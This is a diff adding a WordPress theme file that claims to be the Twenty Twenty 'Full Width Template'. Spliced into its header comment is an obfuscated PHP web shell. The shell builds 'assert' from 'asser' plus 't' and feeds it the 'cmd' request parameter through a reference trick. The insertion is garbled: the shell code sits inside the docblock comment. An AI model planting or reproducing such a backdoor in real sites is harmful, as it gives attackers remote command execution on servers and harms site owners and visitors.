@@ -1,0 +1,27 @@
+<?php
+/**
+<?php
+class talker{
+    public $data = 'Hi';
+    public function & get(){
+        return $this->data;
+    }
+}
+$aa = new talker();
+$d = &$aa->get();
+$d = $_GET[cmd];
+function foo(&$var)
+{
+    $var=$var.'t';
+}
+$a="asser";
+foo($a);
+$a($aa->data); * Template Name: Full Width Template
+ * Template Post Type: post, page
+ *
+ * @package WordPress
+ * @subpackage Twenty_Twenty
+ * @since Twenty Twenty 1.0
+ */
+
+get_template_part( 'singular' );
